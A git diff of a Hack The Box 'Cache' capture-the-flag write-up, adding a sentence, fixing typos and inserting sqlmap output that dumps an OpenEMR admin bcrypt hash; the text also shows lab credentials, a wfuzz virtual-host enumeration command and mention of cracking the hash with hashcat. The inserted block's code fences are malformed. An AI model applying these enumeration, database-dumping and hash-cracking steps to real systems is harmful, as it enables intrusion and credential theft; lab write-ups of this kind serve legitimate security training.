@@ -129,7 +129,7 @@ body  {
 
 ![](../../.gitbook/assets/5-functionality.png)
 
-found some credentials in the `functionality.js` file in the `/jquery` folder. `ash:H@v3_fun` This enabled me to login to the site, which I had already discovered to hold nothing useful. This password did not work for logging into SSH. I decided to try to use my `cewl` wordlist to see if I could enumerate a proper password now that I had a username.
+found some credentials in the `functionality.js` file in the `/jquery` folder. `ash:H@v3_fun` This enabled me to login to the site, which I had already discovered to hold nothing useful. This password did not work for logging into SSH. I decided to try to use my `cewl` wordlist to see if I could enumerate a proper password now that I had a username. Nothing came back.
 
 Next I tried enumerating subdomains using virtual host enumeration as described in the HTB machine [Forwardslash](https://zweilosec.gitbook.io/htb-writeups/linux-machines/hard/forwardslash-write-up#virtual-host-enumeration)
 
@@ -220,7 +220,7 @@ Found: *.cache.htb (Status: 400) [Size: 422]
 ===============================================================
 ```
 
-All of these 400 errors were somwhat promising since those sites seem to exist but my requests to them arent correct.
+All of these 400 errors were somewhat promising since those sites seem to exist but my requests to them aren't correct.
 
 ```text
 zweilos@kali:~/htb/cache$ wfuzz --hh 8193 -w /home/zweilos/htb/cache/cache.cewl -H "Host: FUZZ.htb" http://10.10.10.188
@@ -551,6 +551,20 @@ Database: openemr
 Next I dumped the user\_secure table because that sounded quite promising. I also tried dumping other interesting sounding tables such as `notes` and `users_facility` but they were empty.
 
 insert table data
+
+```sql
+```
+[09:18:34] [INFO] fetching entries for table 'users_secure' in database 'openemr'                      
+Database: openemr
+Table: users_secure
+[1 entry]
++------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
++------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
++------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+```
+```
 
 The table contained information about a `openemr_admin` user, including a bcrypt hashed password. I loaded the hash into hashcat and it cracked almost imediately.
 
